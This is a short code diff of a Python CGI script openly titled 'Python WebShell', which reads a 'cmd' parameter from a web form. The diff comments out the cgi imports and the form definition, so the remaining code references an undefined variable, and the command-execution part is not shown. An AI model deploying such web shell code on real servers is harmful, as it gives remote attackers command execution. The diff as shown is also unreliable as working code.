@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 
-import cgi
-import cgitb
-cgitb.enable()
+#import cgi
+#import cgitb
+#cgitb.enable()
 
 print("Content-Type: text/html")
 print()
@@ -10,7 +10,7 @@ print()
 print("<html><head><title>Python WebShell</title></head>")
 print("<body><h1>Python WebShell</h1>")
 
-form = cgi.FieldStorage()
+#form = cgi.FieldStorage()
 
 if "cmd" in form:
     cmd = form["cmd"].value
